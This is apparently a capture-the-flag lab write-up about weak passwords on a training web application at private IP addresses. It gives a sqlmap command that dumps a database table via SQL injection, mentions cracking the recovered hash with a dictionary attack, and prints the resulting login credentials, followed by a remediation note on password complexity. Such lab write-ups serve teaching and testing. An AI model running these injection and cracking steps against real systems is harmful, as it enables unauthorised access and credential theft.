# 11_Brute_force

We can brute force login by allowing / using simple, common passwords

## Method & Manipulation

sqlmap.py -u "http://192.168.1.70/index.php?page=member&id=5&Submit=Submit#" --dump -D Member_Brute_Force -T db_default
and use dictionary attack can use custom dictionary file if you want and decrypt the countersign of getTheFlag

Go to http://192.168.1.59/?page=signin  
Login with the details

```bash
username: root
password: shadow
```

## Resolve

User checks & validation to only allow complex passwords with a combination of upperase characters, numbers, symbols & lowercase characters.

## Resources

https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
